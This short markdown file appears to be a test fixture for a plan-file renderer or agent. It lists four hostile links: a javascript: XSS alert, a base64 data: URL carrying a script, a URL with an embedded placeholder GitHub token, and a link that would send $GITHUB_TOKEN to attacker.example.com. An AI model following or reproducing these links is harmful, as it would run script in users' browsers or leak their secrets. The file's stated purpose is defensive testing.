# Context

A perfectly normal document with a couple of hostile links:

- [click here](javascript:alert('xss'))
- [download](data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=)
- [credentials](https://user:ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@example.com)
- [exfil](https://attacker.example.com/?token=$GITHUB_TOKEN)

None of these should auto-execute or be promoted to agent instructions
just because they appear in a plan markdown file.
